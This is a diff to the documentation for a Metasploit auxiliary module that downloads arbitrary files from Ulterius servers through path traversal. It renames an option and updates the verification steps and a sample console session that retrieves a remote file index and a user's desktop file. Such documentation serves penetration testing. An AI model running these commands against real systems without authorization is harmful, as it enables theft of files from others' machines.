@@ -22,7 +22,7 @@ Note: The [EDB PoC](https://www.exploit-db.com/exploits/43141/) used relative pa
 
 ## Options
 
-**TARGETURI**
+**PATH**
 
 This option specifies the absolute or relative path of the file to download. (default: `/…/fileIndex.db`)
 
@@ -36,7 +36,7 @@ Note: If you are using relative paths, use three periods when traversing down a 
 - [ ] `set rhost <rhost>`
 - [ ] `run`
 - [ ] Verify loot contains file system paths from remote file system.
-- [ ] `set targeturi '/<DriveLetter>:/<path>/<to>/<file>'`
+- [ ] `set path '<DriveLetter>:/<path>/<to>/<file>'`
 - [ ] `run`
 - [ ] Verify contents of file
 
@@ -53,11 +53,11 @@ msf5 auxiliary(admin/http/ulterius_file_download) > run
 [*] Starting to parse fileIndex.db...
 [*] Remote file paths saved in: filepath0
 [*] Auxiliary module execution completed
-msf5 auxiliary(admin/http/ulterius_file_download) > set targeturi '/C:/users/pwnduser/desktop/tmp.txt'
-targeturi => /C:/users/pwnduser/desktop/tmp.txt
+msf5 auxiliary(admin/http/ulterius_file_download) > set path 'C:/users/pwnduser/desktop/tmp.txt'
+path => C:/users/pwnduser/desktop/tmp.txt
 msf5 auxiliary(admin/http/ulterius_file_download) > run
 
-[*] /C:/users/pwnduser/desktop/tmp.txt
+[*] C:/users/pwnduser/desktop/tmp.txt
 [*] File contents saved: filepath1
 [*] Auxiliary module execution completed
 msf5 auxiliary(admin/http/ulterius_file_download) >
